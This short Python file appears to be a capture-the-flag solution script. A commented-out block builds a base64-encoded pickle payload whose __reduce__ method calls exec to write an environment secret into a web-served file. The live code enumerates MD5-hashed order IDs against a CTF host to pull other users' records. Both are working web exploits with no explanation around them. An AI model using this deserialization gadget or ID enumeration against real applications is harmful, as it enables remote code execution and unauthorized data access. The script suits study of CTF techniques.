# import pickle, base64
# class Payload():
#     def __reduce__(self):
#         return (exec,("open('/app/static/flag.txt', 'w').write(__import__('os').environ.get('FLAG'))",))
#
# deserialized_data = pickle.dumps([Payload()]) # serializing data
# deserialized_data = base64.b64encode(deserialized_data).decode()
# print(deserialized_data)
import hashlib, requests
url = 'https://6afb734b-d702-4d8f-a147-6b038a57b163.ctf.ctfinf.ru/orders/'
for x in range(1, 200):
    get = requests.get(url + hashlib.md5(str(x).encode()).hexdigest())
    if 'flag' in get.text or 'vsosh' in get.text:
        print(x)
        print(get.text)